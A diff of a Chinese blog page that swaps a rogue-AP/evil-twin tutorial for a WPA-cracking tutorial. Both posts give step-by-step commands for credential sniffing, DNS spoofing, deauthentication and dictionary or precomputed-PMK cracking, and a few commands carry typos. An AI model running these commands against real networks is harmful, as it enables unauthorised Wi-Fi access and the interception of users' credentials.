@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="流氓ap及用法, Nbb&#39;s Blog">
+    <meta name="keywords" content="wpa破解, Nbb&#39;s Blog">
     <meta name="description" content="It&#39;s Nbb&#39;s Blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>流氓ap及用法 | Nbb&#39;s Blog</title>
+    <title>wpa破解 | Nbb&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -204,12 +204,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">流氓ap及用法</h1>
+                    <h1 class="description center-align post-title">wpa破解</h1>
                 </div>
             </div>
         </div>
@@ -326,8 +326,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/WiFi/">
-                                <span class="chip bg-color">WiFi</span>
+                            <a href="/tags/wifi/">
+                                <span class="chip bg-color">wifi</span>
                             </a>
                         
                     </div>
@@ -367,31 +367,94 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>流氓ap（rogue ap），也叫邪恶双子星（evil twin），老外起名字就是nb。原理非常简单，你有一台可以上网的设备，然后你伪造一个ap，让人们连接你的ap，让流量通过伪造的ap再通过你设备上网，这样你就实现了一个中间人攻击，可以监听流量，甚至可以劫持篡改。</p>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>首先，把网卡导入虚拟机，先用airmon-ng命令关闭可能会影响攻击的进程<br><img src="1.png" alt="airmon-ng命令"><br>用airbase-ng命令开启伪造ap，–essid参数是要伪造的ap名，-c是信道，如果要伪造mac地址的话可以跟上-a加mac地址，该命令会自动增加一块网卡at0，接下来需要把这块网卡和上网的网卡桥接<br><img src="2.png" alt="airbase-ng命令"><br>桥接网卡需要用到bridge-utils工具，kali默认是不自带的，需要用apt安装一下</p>
-<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">apt install bridge-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>使用brctl这个命令，先创建一个网桥，再添加桥接网卡</p>
-<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">brctl addbr br
-添加名叫br的网桥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">brctl addif br eth0
-给网桥添加网卡，eth0是连接网络的网卡
-brctl addif br at0
-at0是ap自动生成的网卡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>接下来把两张网卡的IP设为零，也就是没有IP，这里有一点要注意，设为零之前先记住eth0的IP，之后需要给网桥用</p>
-<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">ifconfig eth0 0.0.0.0 up
-ifconfig at0 0.0.0.0 up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>设置网桥IP为原有线网卡eth0的IP,假设是192.168.1.111</p>
-<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">ifconfig br 192.168.1.111 up<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>改完网卡后ifconfig查看应该是这样的<br><img src="3.png" alt="网卡状态"><br>添加网关，把网关设为路由器地址，不然不能上网</p>
-<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>启动IP转发,这个文件直接vi修改是没有权限的，0代表关闭，1代表开启</p>
-<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">echo 1 &gt; /proc/sys/net/ipv4/ip_forward<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>这个时候应该是能ping通网关能上网的<br><img src="4.png" alt="ping网关"><br>这个时候再用手机连开的wifi应该就能上网了，IP是由路由器分配的，如果路由器有查看连接设备的功能的话，在路由器的管理界面应该可以查看到这个设备<br><img src="5.png" alt="ipad连接"><br>也可以把这些命令写成一个shell脚本，不用每次一条条命令敲<br><img src="10.png" alt="脚本"></p>
-<h2 id="监听流量"><a href="#监听流量" class="headerlink" title="监听流量"></a>监听流量</h2><p>打开wireshark，可以在接口列表看见我们创建的网桥<br><img src="6.png" alt="接口列表"><br>监听网卡，我们就能看见设备的明文流量，我的移动设备分到的IP是192.168.1.114<br><img src="7.png" alt="流量"><br>添加显示筛选器就可以看见设备所有的流量，实战中就可以读取其中的敏感信息，登录凭证等<br><img src="8.png" alt="流量"></p>
-<h2 id="dns劫持"><a href="#dns劫持" class="headerlink" title="dns劫持"></a>dns劫持</h2><p>劫持需要用到的工具是dnsspoof，这个工具包含于dsniff套件中，kali默认也不自带，需要用apt安装<br><img src="9.png" alt="安装dsniff"><br>需要写一个文件，把要欺骗的域名和目的IP用类似hosts文件的格式写在文件里<br><img src="11.png" alt="欺骗的文件"><br>dnsspoof命令需要两个参数，-i指定网卡，-f指定文件</p>
-<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">dnsspoof -i wlan0mon -f 1.hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>这时再在手机上访问nbbs.top就会被重定向到网关</p>
+                <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>wpa协议的安全性相较wep和wps来说是比较高的，到现在为止没有发现能从协议层破解密码的严重漏洞，前几年公布了krack攻击，可以解密监听数据，但也跟密码没关系，对于获取密码最常用的法子还是爆破，所以WiFi字典一般都不会小</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>wpa认证有一个四步握手的过程，我觉得下图比较形象的说明了这四步握手<br><img src="1.png" alt="四步握手"><br>STA是客户端（station），AP是就是无线接入点（access point），开始前还有一步，由于正常情况下双方都知道密钥，他们会先各自由密钥生成相同的PMK，这个PMK是起点，一共需要五个要素生成最终的凭证</p>
+<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>AP先向STA发一个包，其中包含一个随机数ANONCE</p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>STA接到随机数后会自己生成第二个随机数SNONCE，同时AP的包里会有AP的MAC地址，至此五个要素就起了，分别是PMK，ANONCE，SNONCE，AP的MAC，STA的MAC，STA会用这五个要素生成PTK，并计算校验值MIC，然后会将SNONCE和MIC一起发给AP，注意，PMK和PTK自始至终都不会进行传输，传输的是MIC</p>
+<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>AP接到包后也就凑齐了五要素，计算出了PTK，也就可以算出MIC，对比STA发的MIC，如果一样就是通过了认证，接着发送数据包让STA安装组密钥</p>
+<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>STA发送确认包</p>
+<h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><p>看完这四步我们会发现认证主要在前两部，几个要素除了PMK在前两步都出现了，其实甚至可以不用AP，有的骚思路直接伪造ap，随机数我们可以产生，MAC也可以伪造，完全可以通过前两步套出所有要素。回到破解，我们拿到这几个要素后我们就有了验证对错的MIC和计算的所有要素，只有PMK我们没有，而PMK由密钥和essid计算产生，所以我们就可以用字典进行爆破，用字典的密钥计算出PMK，再计算出PTK,计算出MIC，就可以知到密钥的对错</p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>实际操作其实很简单，由原理可以看出其实就抓握手包和爆破两步</p>
+<h3 id="准备网卡"><a href="#准备网卡" class="headerlink" title="准备网卡"></a>准备网卡</h3><p>网卡接入虚拟机，airmon-ng命令准备环境</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">airmon-ng check kill
+杀掉可能有影响的进程
+airmon-ng start wlan0
+把网卡调至monitor模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">airodump-ng -c 11 -w test -d AA:AA:AA:AA:AA:AA wlan0mon
+-c 指定信道，调至目标信道监听效果会更好，不然会进行轮询
+-w 指定保存的文件名，会保存多个文件
+-d 目标的bssid，就是AP的MAC地址
+wlan0mon 网卡，有的无线网卡用airmon-ng改成monitor会改名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>抓到包后右上角会有提示<br><img src="2.png" alt="握手包"><br>这些test开头的都是抓到的文件<br><img src="3.png" alt="抓到的文件"><br>这里有一个问题就是握手包是连接的时候才会有的，那没人连的时候就抓不到了，这时候就要打断已有连接，让他们重连一下，抓取握手包</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">direplay-ng -0 1 -a ap的mac -c 客户端mac wlan0mon
+-0 会发送断开连接的包，让STA和AP断开连接，1是次数，可以随意指定，感觉不稳定可以多发几个包，0会一直发包
+-a ap的mac 
+-c 客户端mac，不加-c参数会广播给所有sta，但是有的客户端可能会拒绝广播的攻击
+wlan0mon 指定网卡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">aircrack-ng -w 1.txt test.cap
+-w 指定字典
+test.cap 抓到的流量文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>破解成功结果，我用的是一个三十万的小字典，把密码加在了最后，可以看出速度是一秒五千，而且不是顺序的，我把密码加在了最后而字典跑了五万就把最后一个拿去跑了，说明他不是严格按顺序跑的，如果跑大字典就可以发现他只是大概按顺序跑<br><img src="4.png" alt="破解结果"></p>
+<h2 id="加速破解"><a href="#加速破解" class="headerlink" title="加速破解"></a>加速破解</h2><p>从之前的破解可以看出，这东西是个挺慢的事，四五千每秒不慢，但是字典动不动百万千万就扛不住了，所以需要加快。<br>从原理上看我们要算PMK，PTK，MIC，而PMK我们可以提前算，只要知道密钥和wifi名就行，而这恰巧是计算量最大的一步，所以我们可以提前把字典算成彩虹表，这样实际破解的时候速度就会加快不少。</p>
+<h3 id="airolib"><a href="#airolib" class="headerlink" title="airolib"></a>airolib</h3><p>这是aircrack套件的一部分，会维护一个数据库，算出彩虹表后会存在数据库里，aircrack可以直接从数据库里读取<br>计算PMK</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">echo ap的essid &gt; essid.txt
+airolib-ng db --import essid essid.txt
+创建数据库，导入essid
+
+airolib-ng db --import passwd 字典
+导入字典，自动去除不符合格式的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">airolib-ng db --stats
+查看数据库状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">airolib-ng db --batch
+生成pmk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>执行破解</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">aircrack-ng -r db test.cap
+用数据库中的哈希表进行破解
+-r 使用数据库
+test.cap 破解文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="cowpatty"><a href="#cowpatty" class="headerlink" title="cowpatty"></a>cowpatty</h3><p>这是一个单独的wpa爆破工具，可以生成彩虹表和wpa爆破<br>使用密码字典爆破</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">cowpatty r wpa.cap -f password.lst -s essid
+-r 流量文件
+-f 字典文件
+-s essid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>彩虹表爆破</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">genpmk -f password.lst -d 生成的hash文件 -s essid
+生成彩虹表
+-f 字典
+-s essid
+-d 生成的彩虹表文件名
+cowpatty -r wpa.cap -d 生成的hash文件 -s essid
+-r 流量文件
+-d 彩虹表
+-s essid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="pyrit"><a href="#pyrit" class="headerlink" title="pyrit"></a>pyrit</h3><p>该工具特殊的地方在于它能调用GPU算力来算彩虹表，别的工具只能用cpu，但是使用条件比较苛刻，他要用显卡，而虚拟机装显卡驱动特别麻烦，要用的话基本得本机装kali，而且kali也不自带这个工具</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">可以自己抓取数据包，不用airodump-ng
+pyrit -r wlan0mon -o wpa.cap sriplive
+抓包保存为wpa.cap，只保留握手包
+pyrit -r wpa.cap analyze
+分析数据包
+pyrit -r wpa.cap -o wpapyrit.cap strip
+读取airodump抓的包，转换成pyrit格式，并去除其他包只保留握手<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">用密码直接破解
+pyrit  -r wpa.cap -I pass.lst -b ap的mac attack_passthrough<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">彩虹表模式破解
+  默认使用基于文件的数据库，支持连接sql数据库，将计算的pmk存  数据库
+  查看默认数据库状态
+  pyrit eval
+  导入密码字典（自动剔除不合规密码）
+  pyrit -I password.lst import_passwords
+  指定essid
+  pyrit -e essid create_essid
+  计算pmk，发挥gpu算力
+  pyrit batch
+  破解密码
+  pyrit -r wpa.cap -b ap的mac attack_db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
             </div>
             <hr/>
 
@@ -416,7 +479,7 @@ ifconfig at0 0.0.0.0 up<span aria-hidden="true" class="line-numbers-rows"><span>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2020/12/07/liu-mang-ap-ji-yong-fa/">http://example.com/2020/12/07/liu-mang-ap-ji-yong-fa/</a>
+                    <a href="http://example.com/2020/12/07/wpa-po-jie/">http://example.com/2020/12/07/wpa-po-jie/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -454,8 +517,8 @@ ifconfig at0 0.0.0.0 up<span aria-hidden="true" class="line-numbers-rows"><span>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/WiFi/">
-                                    <span class="chip bg-color">WiFi</span>
+                                <a href="/tags/wifi/">
+                                    <span class="chip bg-color">wifi</span>
                                 </a>
                             
                         </div>
@@ -497,9 +560,10 @@ ifconfig at0 0.0.0.0 up<span aria-hidden="true" class="line-numbers-rows"><span>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/12/07/wpa-po-jie/">
                     <div class="card-image">
@@ -517,9 +581,9 @@ ifconfig at0 0.0.0.0 up<span aria-hidden="true" class="line-numbers-rows"><span>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-12-07
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-07
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -532,6 +596,7 @@ ifconfig at0 0.0.0.0 up<span aria-hidden="true" class="line-numbers-rows"><span>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -550,31 +615,31 @@ ifconfig at0 0.0.0.0 up<span aria-hidden="true" class="line-numbers-rows"><span>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/04/shi-yong-jdbc-de-shi-hou-fa-xian-de-yi-dian-xiao-yi-wai/">
+                <a href="/2020/12/07/liu-mang-ap-ji-yong-fa/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="使用JDBC的时候发现的一点小意外">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="流氓ap及用法">
                         
-                        <span class="card-title">使用JDBC的时候发现的一点小意外</span>
+                        <span class="card-title">流氓ap及用法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            某一天中午
+                            某一天下午
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-07
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/java/" class="post-category">
-                                    java
+                            <a href="/categories/WiFi/" class="post-category">
+                                    WiFi
                                 </a>
                             
                             
@@ -584,12 +649,8 @@ ifconfig at0 0.0.0.0 up<span aria-hidden="true" class="line-numbers-rows"><span>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/JDBC/">
-                        <span class="chip bg-color">JDBC</span>
-                    </a>
-                    
-                    <a href="/tags/java/">
-                        <span class="chip bg-color">java</span>
+                    <a href="/tags/WiFi/">
+                        <span class="chip bg-color">WiFi</span>
                     </a>
                     
                 </div>
